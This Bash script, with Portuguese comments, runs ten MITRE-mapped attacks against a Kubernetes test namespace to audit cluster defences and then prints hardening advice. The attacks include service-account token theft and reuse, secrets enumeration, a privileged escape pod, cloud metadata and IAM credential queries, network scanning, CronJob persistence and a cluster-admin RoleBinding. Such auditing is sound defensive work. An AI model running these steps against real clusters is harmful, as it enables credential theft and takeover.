#!/bin/bash

#############################################################################
# Kubernetes Attack Simulation Script
#
# AVISO IMPORTANTE: Este script executa ataques REAIS em um cluster Kubernetes.
# Use APENAS em ambientes de teste isolados com permissão explícita.
#
# Este script simula técnicas de ataque do MITRE ATT&CK Framework para
# Kubernetes, permitindo testar defesas e detectar vulnerabilidades.
#############################################################################

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

ATTACK_NAMESPACE="${1:-pentest-lab}"
RESULTS_DIR="./attack-results-$(date +%Y%m%d-%H%M%S)"

print_banner() {
    echo -e "${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════╗"
    echo "║     ██╗  ██╗ █████╗ ███████╗     █████╗ ████████╗████████╗ █████╗    ║"
    echo "║     ██║ ██╔╝██╔══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗   ║"
    echo "║     █████╔╝ ╚█████╔╝███████╗    ███████║   ██║      ██║   ███████║   ║"
    echo "║     ██╔═██╗ ██╔══██╗╚════██║    ██╔══██║   ██║      ██║   ██╔══██║   ║"
    echo "║     ██║  ██╗╚█████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║   ║"
    echo "║     ╚═╝  ╚═╝ ╚════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝   ║"
    echo "║                                                                       ║"
    echo "║          Kubernetes Attack Simulation Framework                       ║"
    echo "║          APENAS PARA AMBIENTES AUTORIZADOS                            ║"
    echo "╚═══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_attack() {
    echo -e "${RED}[ATTACK]${NC} $1"
}

log_result() {
    echo -e "${GREEN}[RESULT]${NC} $1"
}

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_section() {
    echo ""
    echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE}  $1${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
}

confirm_execution() {
    echo -e "${YELLOW}"
    echo "╔═══════════════════════════════════════════════════════════════════╗"
    echo "║                          AVISO                                    ║"
    echo "║                                                                   ║"
    echo "║  Este script executará ataques reais no cluster Kubernetes.       ║"
    echo "║  Certifique-se de que:                                            ║"
    echo "║                                                                   ║"
    echo "║  1. Você tem autorização para executar estes testes               ║"
    echo "║  2. Este é um ambiente de teste/desenvolvimento isolado           ║"
    echo "║  3. Você entende os riscos envolvidos                             ║"
    echo "║                                                                   ║"
    echo "╚═══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    read -p "Digite 'CONCORDO' para continuar: " response
    if [ "$response" != "CONCORDO" ]; then
        echo "Execução cancelada."
        exit 1
    fi
}

setup_attack_environment() {
    log_section "Configurando Ambiente de Ataque"

    mkdir -p "$RESULTS_DIR"

    log_info "Criando namespace de teste: $ATTACK_NAMESPACE"
    kubectl create namespace "$ATTACK_NAMESPACE" --dry-run=client -o yaml | kubectl apply -f - 2>/dev/null || true

    log_info "Ambiente preparado em: $RESULTS_DIR"
}

#############################################################################
# ATAQUE 1: Service Account Token Theft
# MITRE: T1528 - Steal Application Access Token
#############################################################################
attack_sa_token_theft() {
    log_section "ATAQUE 1: Service Account Token Theft"
    log_attack "Criando pod para roubar service account token..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: sa-token-thief
  namespace: $ATTACK_NAMESPACE
spec:
  containers:
  - name: attacker
    image: curlimages/curl:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Service Account Token Theft Test ===" > /tmp/results.txt
      echo "Token location: /var/run/secrets/kubernetes.io/serviceaccount/token" >> /tmp/results.txt
      if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
        echo "TOKEN FOUND - This is a security risk if not intended" >> /tmp/results.txt
        echo "Namespace: \$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)" >> /tmp/results.txt
        TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        echo "Token Preview (first 50 chars): \${TOKEN:0:50}..." >> /tmp/results.txt

        # Tentar usar o token para acessar a API
        echo "" >> /tmp/results.txt
        echo "=== API Access Test ===" >> /tmp/results.txt
        RESPONSE=\$(curl -sk -H "Authorization: Bearer \$TOKEN" https://kubernetes.default.svc/api/v1/namespaces 2>&1)
        if echo "\$RESPONSE" | grep -q "items"; then
          echo "VULNERABLE: Token can list namespaces!" >> /tmp/results.txt
        else
          echo "Protected: Cannot list namespaces" >> /tmp/results.txt
        fi
      else
        echo "Token not mounted - Good security practice" >> /tmp/results.txt
      fi
      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 5
    log_result "Verificando resultado do ataque..."
    kubectl logs sa-token-thief -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/sa-token-theft.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 2: Container Escape via Privileged Pod
# MITRE: T1611 - Escape to Host
#############################################################################
attack_container_escape() {
    log_section "ATAQUE 2: Container Escape Attempt"
    log_attack "Tentando criar pod privilegiado para escape..."

    cat <<EOF > "$RESULTS_DIR/privileged-pod.yaml"
apiVersion: v1
kind: Pod
metadata:
  name: privileged-escape-test
  namespace: $ATTACK_NAMESPACE
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: escape-test
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Container Escape Test ===" > /tmp/escape-results.txt
      echo "hostPID: Enabled" >> /tmp/escape-results.txt
      echo "hostNetwork: Enabled" >> /tmp/escape-results.txt
      echo "hostIPC: Enabled" >> /tmp/escape-results.txt

      echo "" >> /tmp/escape-results.txt
      echo "=== Host Process Visibility ===" >> /tmp/escape-results.txt
      ps aux | head -20 >> /tmp/escape-results.txt

      echo "" >> /tmp/escape-results.txt
      echo "=== Network Interfaces (Host) ===" >> /tmp/escape-results.txt
      ip addr 2>/dev/null | head -30 >> /tmp/escape-results.txt || ifconfig 2>/dev/null | head -30 >> /tmp/escape-results.txt

      cat /tmp/escape-results.txt
      sleep 300
    securityContext:
      privileged: true
  restartPolicy: Never
EOF

    if kubectl apply -f "$RESULTS_DIR/privileged-pod.yaml" 2>&1 | tee "$RESULTS_DIR/escape-attempt.txt"; then
        log_result "${RED}VULNERÁVEL: Pod privilegiado foi criado!${NC}"
        sleep 5
        kubectl logs privileged-escape-test -n "$ATTACK_NAMESPACE" 2>/dev/null | tee -a "$RESULTS_DIR/escape-attempt.txt" || true
    else
        log_result "${GREEN}PROTEGIDO: Pod privilegiado foi bloqueado${NC}"
    fi
}

#############################################################################
# ATAQUE 3: Secrets Enumeration
# MITRE: T1552.007 - Container API
#############################################################################
attack_secrets_enum() {
    log_section "ATAQUE 3: Secrets Enumeration"
    log_attack "Tentando enumerar secrets via API..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: secrets-enum
  namespace: $ATTACK_NAMESPACE
spec:
  containers:
  - name: enum
    image: curlimages/curl:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Secrets Enumeration Test ===" > /tmp/results.txt
      TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")

      if [ -n "\$TOKEN" ]; then
        echo "Attempting to list secrets in all namespaces..." >> /tmp/results.txt

        for ns in default kube-system kube-public; do
          echo "" >> /tmp/results.txt
          echo "=== Namespace: \$ns ===" >> /tmp/results.txt
          RESULT=\$(curl -sk -H "Authorization: Bearer \$TOKEN" \
            "https://kubernetes.default.svc/api/v1/namespaces/\$ns/secrets" 2>&1)

          if echo "\$RESULT" | grep -q '"items"'; then
            echo "VULNERABLE: Can access secrets in \$ns!" >> /tmp/results.txt
            echo "\$RESULT" | grep '"name"' | head -5 >> /tmp/results.txt
          else
            echo "Protected: Cannot access secrets in \$ns" >> /tmp/results.txt
          fi
        done
      else
        echo "No SA token available" >> /tmp/results.txt
      fi
      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 5
    kubectl logs secrets-enum -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/secrets-enum.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 4: Lateral Movement via Pod Creation
# MITRE: T1610 - Deploy Container
#############################################################################
attack_lateral_movement() {
    log_section "ATAQUE 4: Lateral Movement via Pod Creation"
    log_attack "Testando capacidade de criar pods em outros namespaces..."

    # Criar ServiceAccount para teste
    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: ServiceAccount
metadata:
  name: lateral-test-sa
  namespace: $ATTACK_NAMESPACE
---
apiVersion: v1
kind: Pod
metadata:
  name: lateral-movement
  namespace: $ATTACK_NAMESPACE
spec:
  serviceAccountName: lateral-test-sa
  containers:
  - name: attacker
    image: bitnami/kubectl:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Lateral Movement Test ===" > /tmp/results.txt

      # Testar criação de pods em vários namespaces
      for ns in default kube-system kube-public; do
        echo "" >> /tmp/results.txt
        echo "=== Testing namespace: \$ns ===" >> /tmp/results.txt

        CAN_CREATE=\$(kubectl auth can-i create pods -n \$ns 2>&1)
        echo "Can create pods in \$ns: \$CAN_CREATE" >> /tmp/results.txt

        CAN_EXEC=\$(kubectl auth can-i create pods/exec -n \$ns 2>&1)
        echo "Can exec into pods in \$ns: \$CAN_EXEC" >> /tmp/results.txt

        CAN_DELETE=\$(kubectl auth can-i delete pods -n \$ns 2>&1)
        echo "Can delete pods in \$ns: \$CAN_DELETE" >> /tmp/results.txt
      done

      echo "" >> /tmp/results.txt
      echo "=== Full Permissions Check ===" >> /tmp/results.txt
      kubectl auth can-i --list 2>&1 | head -30 >> /tmp/results.txt

      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 10
    kubectl logs lateral-movement -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/lateral-movement.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 5: DNS Exfiltration Test
# MITRE: T1048 - Exfiltration Over Alternative Protocol
#############################################################################
attack_dns_exfil() {
    log_section "ATAQUE 5: DNS Exfiltration Capability Test"
    log_attack "Testando capacidade de exfiltração via DNS..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: dns-exfil-test
  namespace: $ATTACK_NAMESPACE
spec:
  containers:
  - name: dns-test
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== DNS Exfiltration Capability Test ===" > /tmp/results.txt
      apk add --no-cache bind-tools > /dev/null 2>&1

      # Test DNS resolution (simulating data exfil)
      echo "Testing external DNS resolution..." >> /tmp/results.txt

      # Encode simulated data as DNS query
      DATA="test-data-\$(date +%s)"
      echo "Simulated exfil data: \$DATA" >> /tmp/results.txt

      if nslookup google.com > /dev/null 2>&1; then
        echo "RISK: External DNS resolution works - potential exfil vector" >> /tmp/results.txt
      else
        echo "Protected: External DNS blocked" >> /tmp/results.txt
      fi

      # Check DNS server
      echo "" >> /tmp/results.txt
      echo "DNS Configuration:" >> /tmp/results.txt
      cat /etc/resolv.conf >> /tmp/results.txt

      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 10
    kubectl logs dns-exfil-test -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/dns-exfil.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 6: Metadata Service Access (Cloud)
# MITRE: T1552.005 - Cloud Instance Metadata API
#############################################################################
attack_metadata_service() {
    log_section "ATAQUE 6: Cloud Metadata Service Access"
    log_attack "Testando acesso ao metadata service (AWS/GCP/Azure)..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: metadata-access
  namespace: $ATTACK_NAMESPACE
spec:
  containers:
  - name: metadata
    image: curlimages/curl:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Cloud Metadata Service Test ===" > /tmp/results.txt

      # AWS IMDS
      echo "" >> /tmp/results.txt
      echo "=== AWS IMDS Test ===" >> /tmp/results.txt
      AWS_RESULT=\$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>&1)
      if echo "\$AWS_RESULT" | grep -qiE "ami-id|instance-id|hostname"; then
        echo "VULNERABLE: AWS IMDS accessible!" >> /tmp/results.txt
        echo "\$AWS_RESULT" | head -10 >> /tmp/results.txt

        # Try to get IAM credentials
        echo "" >> /tmp/results.txt
        echo "=== Attempting IAM Credential Access ===" >> /tmp/results.txt
        IAM_ROLE=\$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)
        echo "IAM Role: \$IAM_ROLE" >> /tmp/results.txt
      else
        echo "Protected: AWS IMDS not accessible or not AWS" >> /tmp/results.txt
      fi

      # GCP Metadata
      echo "" >> /tmp/results.txt
      echo "=== GCP Metadata Test ===" >> /tmp/results.txt
      GCP_RESULT=\$(curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>&1)
      if echo "\$GCP_RESULT" | grep -qi "project"; then
        echo "VULNERABLE: GCP Metadata accessible!" >> /tmp/results.txt
        echo "\$GCP_RESULT" | head -10 >> /tmp/results.txt
      else
        echo "Protected: GCP Metadata not accessible or not GCP" >> /tmp/results.txt
      fi

      # Azure IMDS
      echo "" >> /tmp/results.txt
      echo "=== Azure IMDS Test ===" >> /tmp/results.txt
      AZURE_RESULT=\$(curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1)
      if echo "\$AZURE_RESULT" | grep -qi "compute"; then
        echo "VULNERABLE: Azure IMDS accessible!" >> /tmp/results.txt
        echo "\$AZURE_RESULT" | head -10 >> /tmp/results.txt
      else
        echo "Protected: Azure IMDS not accessible or not Azure" >> /tmp/results.txt
      fi

      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 10
    kubectl logs metadata-access -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/metadata-access.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 7: Network Scanning
# MITRE: T1046 - Network Service Scanning
#############################################################################
attack_network_scan() {
    log_section "ATAQUE 7: Internal Network Scanning"
    log_attack "Executando scan de rede interna..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: network-scanner
  namespace: $ATTACK_NAMESPACE
spec:
  containers:
  - name: scanner
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Internal Network Scan ===" > /tmp/results.txt
      apk add --no-cache nmap > /dev/null 2>&1

      # Get pod CIDR
      MY_IP=\$(hostname -i)
      SUBNET=\$(echo \$MY_IP | cut -d. -f1-3).0/24

      echo "Scanner IP: \$MY_IP" >> /tmp/results.txt
      echo "Scanning subnet: \$SUBNET" >> /tmp/results.txt
      echo "" >> /tmp/results.txt

      # Quick scan for common K8s ports
      echo "=== Service Discovery (Common Ports) ===" >> /tmp/results.txt

      # Kubernetes API Server
      if nc -z -w1 kubernetes.default.svc 443 2>/dev/null; then
        echo "FOUND: Kubernetes API Server (kubernetes.default.svc:443)" >> /tmp/results.txt
      fi

      # etcd
      if nc -z -w1 etcd-0.etcd 2379 2>/dev/null; then
        echo "FOUND: etcd (etcd-0.etcd:2379)" >> /tmp/results.txt
      fi

      # Scan for services in common namespaces
      for svc in "kube-dns.kube-system:53" "metrics-server.kube-system:443" "dashboard.kubernetes-dashboard:443"; do
        HOST=\$(echo \$svc | cut -d: -f1)
        PORT=\$(echo \$svc | cut -d: -f2)
        if nc -z -w1 \$HOST \$PORT 2>/dev/null; then
          echo "FOUND: \$svc" >> /tmp/results.txt
        fi
      done

      # Light subnet scan
      echo "" >> /tmp/results.txt
      echo "=== Quick Subnet Scan ===" >> /tmp/results.txt
      nmap -sn --max-retries 1 --host-timeout 2s \$SUBNET 2>/dev/null | grep -E "Nmap scan|Host is" | head -20 >> /tmp/results.txt

      cat /tmp/results.txt
      sleep 300
  restartPolicy: Never
EOF

    sleep 15
    kubectl logs network-scanner -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/network-scan.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 8: Crypto Mining Simulation
# MITRE: T1496 - Resource Hijacking
#############################################################################
attack_resource_abuse() {
    log_section "ATAQUE 8: Resource Abuse Detection Test"
    log_attack "Testando detecção de abuso de recursos (simula cryptomining)..."

    cat <<EOF | kubectl apply -f - 2>/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: resource-abuse-test
  namespace: $ATTACK_NAMESPACE
  labels:
    test: resource-abuse
spec:
  containers:
  - name: cpu-stress
    image: alpine:latest
    command: ["/bin/sh", "-c"]
    args:
    - |
      echo "=== Resource Abuse Test ===" > /tmp/results.txt
      echo "This test simulates high CPU usage (common in cryptomining)" >> /tmp/results.txt
      echo "A proper monitoring system should detect this!" >> /tmp/results.txt

      # Light CPU stress for detection
      echo "Starting CPU stress test (5 seconds)..." >> /tmp/results.txt
      START=\$(date +%s)
      while [ \$((START + 5)) -gt \$(date +%s) ]; do
        echo "scale=10000; 4*a(1)" | bc -l > /dev/null 2>&1 || true
      done
      echo "CPU stress complete" >> /tmp/results.txt

      cat /tmp/results.txt
      sleep 300
    resources:
      limits:
        cpu: "500m"
        memory: "128Mi"
  restartPolicy: Never
EOF

    sleep 10
    kubectl logs resource-abuse-test -n "$ATTACK_NAMESPACE" 2>/dev/null | tee "$RESULTS_DIR/resource-abuse.txt" || echo "Pod ainda iniciando..."
}

#############################################################################
# ATAQUE 9: Persistence via CronJob
# MITRE: T1053.007 - Container Orchestration Job
#############################################################################
attack_persistence() {
    log_section "ATAQUE 9: Persistence via CronJob"
    log_attack "Tentando criar CronJob para persistência..."

    cat <<EOF > "$RESULTS_DIR/persistence-cronjob.yaml"
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence-test
  namespace: $ATTACK_NAMESPACE
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: persist
            image: curlimages/curl:latest
            command: ["/bin/sh", "-c"]
            args:
            - |
              echo "Persistence mechanism executed at \$(date)"
              # In a real attack, this would phone home or maintain access
          restartPolicy: Never
EOF

    if kubectl apply -f "$RESULTS_DIR/persistence-cronjob.yaml" 2>&1 | tee "$RESULTS_DIR/persistence-test.txt"; then
        log_result "${RED}VULNERÁVEL: CronJob de persistência foi criado!${NC}"
    else
        log_result "${GREEN}PROTEGIDO: CronJob de persistência foi bloqueado${NC}"
    fi
}

#############################################################################
# ATAQUE 10: RBAC Privilege Escalation
# MITRE: T1548 - Abuse Elevation Control Mechanism
#############################################################################
attack_rbac_escalation() {
    log_section "ATAQUE 10: RBAC Privilege Escalation"
    log_attack "Testando escalação de privilégios via RBAC..."

    # Tentar criar ClusterRoleBinding
    cat <<EOF > "$RESULTS_DIR/rbac-escalation.yaml"
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: escalation-test
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: $ATTACK_NAMESPACE
EOF

    if kubectl apply -f "$RESULTS_DIR/rbac-escalation.yaml" 2>&1 | tee "$RESULTS_DIR/rbac-escalation-result.txt"; then
        log_result "${RED}CRÍTICO: Escalação de privilégios RBAC bem sucedida!${NC}"
        # Limpar imediatamente
        kubectl delete -f "$RESULTS_DIR/rbac-escalation.yaml" 2>/dev/null || true
    else
        log_result "${GREEN}PROTEGIDO: Escalação de privilégios RBAC bloqueada${NC}"
    fi
}

#############################################################################
# Limpeza
#############################################################################
cleanup() {
    log_section "Limpeza do Ambiente de Teste"

    read -p "Deseja remover todos os recursos de teste? (s/n): " response
    if [ "$response" = "s" ] || [ "$response" = "S" ]; then
        log_info "Removendo namespace de teste e todos os recursos..."
        kubectl delete namespace "$ATTACK_NAMESPACE" --ignore-not-found=true
        kubectl delete clusterrolebinding escalation-test --ignore-not-found=true 2>/dev/null || true
        log_info "Limpeza concluída"
    else
        log_info "Recursos mantidos no namespace: $ATTACK_NAMESPACE"
    fi
}

#############################################################################
# Relatório Final
#############################################################################
generate_report() {
    log_section "RELATÓRIO FINAL"

    REPORT_FILE="$RESULTS_DIR/FULL-REPORT.txt"

    cat > "$REPORT_FILE" << EOF
═══════════════════════════════════════════════════════════════════
            KUBERNETES ATTACK SIMULATION REPORT
            Generated: $(date)
═══════════════════════════════════════════════════════════════════

NAMESPACE DE TESTE: $ATTACK_NAMESPACE

TESTES EXECUTADOS:
1. Service Account Token Theft
2. Container Escape via Privileged Pod
3. Secrets Enumeration
4. Lateral Movement via Pod Creation
5. DNS Exfiltration Capability
6. Cloud Metadata Service Access
7. Internal Network Scanning
8. Resource Abuse Detection
9. Persistence via CronJob
10. RBAC Privilege Escalation

═══════════════════════════════════════════════════════════════════
RESULTADOS INDIVIDUAIS:
═══════════════════════════════════════════════════════════════════

EOF

    for file in "$RESULTS_DIR"/*.txt; do
        if [ -f "$file" ] && [ "$file" != "$REPORT_FILE" ]; then
            echo "--- $(basename "$file") ---" >> "$REPORT_FILE"
            cat "$file" >> "$REPORT_FILE"
            echo "" >> "$REPORT_FILE"
        fi
    done

    cat >> "$REPORT_FILE" << EOF

═══════════════════════════════════════════════════════════════════
RECOMENDAÇÕES DE SEGURANÇA:
═══════════════════════════════════════════════════════════════════

1. Pod Security Standards:
   - Implementar 'restricted' PSS em namespaces de produção
   - Bloquear pods privilegiados, hostPID, hostNetwork

2. RBAC:
   - Aplicar princípio de menor privilégio
   - Auditar regularmente ClusterRoleBindings
   - Desabilitar automountServiceAccountToken

3. Network Policies:
   - Implementar default-deny em todos os namespaces
   - Bloquear acesso ao metadata service (169.254.169.254)
   - Segmentar comunicação entre namespaces

4. Secrets Management:
   - Usar external secrets operators (Vault, AWS Secrets Manager)
   - Encriptar secrets at rest
   - Rotacionar secrets regularmente

5. Runtime Security:
   - Instalar Falco ou similar para detecção de ameaças
   - Implementar admission controllers (OPA/Gatekeeper)
   - Monitorar comportamento anômalo de containers

6. Monitoring:
   - Configurar alertas para eventos de segurança
   - Habilitar audit logging no API server
   - Monitorar uso de recursos para detectar cryptomining

═══════════════════════════════════════════════════════════════════
FIM DO RELATÓRIO
═══════════════════════════════════════════════════════════════════
EOF

    echo ""
    echo -e "${GREEN}Relatório completo gerado em: $REPORT_FILE${NC}"
    echo -e "${CYAN}Diretório de resultados: $RESULTS_DIR${NC}"
}

#############################################################################
# Main
#############################################################################
main() {
    print_banner
    confirm_execution
    setup_attack_environment

    attack_sa_token_theft
    attack_container_escape
    attack_secrets_enum
    attack_lateral_movement
    attack_dns_exfil
    attack_metadata_service
    attack_network_scan
    attack_resource_abuse
    attack_persistence
    attack_rbac_escalation

    generate_report
    cleanup

    echo ""
    echo -e "${CYAN}Simulação de ataques concluída!${NC}"
    echo -e "${YELLOW}Revise os resultados em: $RESULTS_DIR${NC}"
}

main "$@"
